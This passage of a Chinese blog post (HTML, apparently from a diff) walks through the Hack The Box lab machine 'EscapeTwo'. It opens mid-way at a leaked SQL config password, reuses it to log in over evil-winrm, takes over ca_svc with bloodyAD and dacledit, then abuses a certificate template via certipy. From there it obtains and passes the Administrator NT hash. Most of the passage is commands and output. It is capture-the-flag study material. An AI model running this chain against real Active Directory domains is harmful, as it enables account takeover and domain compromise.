class="line">RSSVCACCOUNT=&quot;NT Service\ReportServer$SQLEXPRESS&quot;</span><br><span class="line">AGTSVCACCOUNT=&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span><br><span class="line">AGTSVCSTARTUPTYPE=&quot;Manual&quot;</span><br><span class="line">COMMFABRICPORT=&quot;0&quot;</span><br><span class="line">COMMFABRICNETWORKLEVEL=&quot;&quot;0&quot;</span><br><span class="line">COMMFABRICENCRYPTION=&quot;0&quot;</span><br><span class="line">MATRIXCMBRICKCOMMPORT=&quot;0&quot;</span><br><span class="line">SQLSVCSTARTUPTYPE=&quot;Automatic&quot;</span><br><span class="line">FILESTREAMLEVEL=&quot;0&quot;</span><br><span class="line">ENABLERANU=&quot;False&quot;</span><br><span class="line">SQLCOLLATION=&quot;SQL_Latin1_General_CP1_CI_AS&quot;</span><br><span class="line">SQLSVCACCOUNT=&quot;SEQUEL\sql_svc&quot;</span><br><span class="line">SQLSVCPASSWORD=&quot;WqSZAF6CysDQbGb3&quot;</span><br><span class="line">SQLSYSADMINACCOUNTS=&quot;SEQUEL\Administrator&quot;</span><br><span class="line">SECURITYMODE=&quot;SQL&quot;</span><br><span class="line">SAPWD=&quot;MSSQLP@ssw0rd!&quot;</span><br><span class="line">ADDCURRENTUSERASSQLADMIN=&quot;False&quot;</span><br><span class="line">TCPENABLED=&quot;1&quot;</span><br><span class="line">NPENABLED=&quot;1&quot;</span><br><span class="line">BROWSERSVCSTARTUPTYPE=&quot;Automatic&quot;</span><br><span class="line">IAcceptSQLServerLicenseTerms=True</span><br></pre></td></tr></table></figure>
+
+<p>使用这个密码WqSZAF6CysDQbGb3登录ryan用户，这个用户是之前翻User文件夹发现的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                   </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                     </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <span class="built_in">ls</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <span class="built_in">cd</span> ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan&gt; <span class="built_in">cd</span> Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; <span class="built_in">dir</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\ryan\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        1/15/2025   4:58 AM              0 BloodHound1.exe</span><br><span class="line">-ar---        1/15/2025   4:56 AM             34 user.txt</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">c4358ec5753a389016a400e0f066df4e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到user flag c4358ec5753a389016a400e0f066df4e。</p>
+<p>设置owner为ryan</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 bloodyAD.py  --host &#x27;10.10.11.51&#x27; -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; set owner &#x27;ca_svc&#x27; &#x27;ryan&#x27;        </span><br><span class="line">[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc</span><br><span class="line">                  </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 bloodyAD.py --host &#x27;10.10.11.51&#x27; -d &#x27;sequel.htb&#x27; -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; set owner &#x27;ca_svc&#x27; &#x27;ryan&#x27; </span><br><span class="line">[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-dacledit  -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; &#x27;sequel.htb&#x27;/&quot;ryan&quot;:&quot;WqSZAF6CysDQbGb3&quot;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250116-155243.bak</span><br><span class="line">[*] DACL modified successfully!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取ca_svc的NT hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy-ad shadow auto -u &#x27;ryan@sequel.htb&#x27; -p &quot;WqSZAF6CysDQbGb3&quot; -account &#x27;ca_svc&#x27; -dc-ip &#x27;10.10.11.51&#x27;                          </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user &#x27;ca_svc&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;b5f7f37d-f48a-0287-01fd-8f3fb1cab473&#x27;</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;b5f7f37d-f48a-0287-01fd-8f3fb1cab473&#x27; to the Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;b5f7f37d-f48a-0287-01fd-8f3fb1cab473&#x27; to the Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Authenticating as &#x27;ca_svc&#x27; with the certificate</span><br><span class="line">[*] Using principal: ca_svc@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;ca_svc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] NT hash for &#x27;ca_svc&#x27;: 3b181b914e7a9d5508ea1e20bc2b7fce</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>覆盖模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating certificate template &#x27;DunderMifflinAuthentication&#x27;</span><br><span class="line">[*] Successfully updated &#x27;DunderMifflinAuthentication&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里是获取管理员的TGT 票据，但是不知道为什么会出现结果不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy-ad req -u ca_svc -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Trying to resolve &#x27;sequel.htb&#x27; at &#x27;10.10.11.51&#x27;</span><br><span class="line">[+] Generating RSA key</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]</span><br><span class="line">[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]</span><br><span class="line">[-] Got error while trying to request certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name.</span><br><span class="line">[*] Request ID is 32</span><br><span class="line">Would you like to save the private key? (y/N) y</span><br><span class="line">[*] Saved private key to 32.key</span><br><span class="line">[-] Failed to request certificate</span><br><span class="line">                                   </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$  certipy-ad req -u ca_svc -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug</span><br><span class="line"></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Trying to resolve &#x27;sequel.htb&#x27; at &#x27;10.10.11.51&#x27;</span><br><span class="line">[+] Generating RSA key</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]</span><br><span class="line">[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 39</span><br><span class="line">[*] Got certificate with multiple identifications</span><br><span class="line">    UPN: &#x27;administrator@sequel.htb&#x27;</span><br><span class="line">    DNS Host Name: &#x27;10.10.11.51&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator_10.pfx&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取NT hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy-ad auth -pfx administrator_10.pfx  -domain sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Found multiple identifications in certificate</span><br><span class="line">[*] Please select one:</span><br><span class="line">    [0] UPN: &#x27;administrator@sequel.htb&#x27;</span><br><span class="line">    [1] DNS Host Name: &#x27;10.10.11.51&#x27;</span><br><span class="line">&gt; 0</span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@sequel.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>登录拿取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.10.11.51 -u &quot;administrator&quot; -H &quot;7a8d4e04986afa8ed4060f75e5a0b3ff&quot;</span><br><span class="line"></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                   </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     </span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        1/15/2025   7:43 PM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</span><br><span class="line">25507243f031ec9f0984529fcf6effd7</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://qwq0qwq.github.io/2025/01/19/EscapeTwo/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://qwq0qwq.github.io/2025/01/19/EscapeTwo/";
+            const title         = "「EscapeTwo」";
+            const excerpt       = `HTB EscapeTwonmap 扫描
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/HTB/" rel="tag">HTB</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2025-01-19T01:17:28.952Z" itemprop="dateModified">最后编辑：2025-01-19</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" plt表和got表" href="/2025/01/07/plt表和got表/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" 免杀学习笔记" href="/2025/01/19/免杀学习笔记/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/icon.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                20
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                3
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/HTB/" style="font-size: 0.6em;">HTB</a> <a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.8em;">java安全</a> <a href="/tags/java%E5%AE%89%E5%85%A8s/" style="font-size: 0.6em;">java安全s</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2025/01/19/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa  fa-book"></i> 免杀学习笔记</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/01/19/EscapeTwo/"><i class="fa  fa-book"></i> EscapeTwo</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/01/07/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/"><i class="fa  fa-book"></i> plt表和got表</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2024/11/24/%E6%9C%A8%E9%A9%AC%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fa  fa-book"></i> 木马隐藏技巧（一）</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2024/11/23/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85/"><i class="fa  fa-book"></i> 安卓抓包</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <!-- Keep for compatibility -->
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <!-- New links -->
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2025 QWQ0QWQ's blog 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by QWQ0QWQ.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://QwQ0QwQ.github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
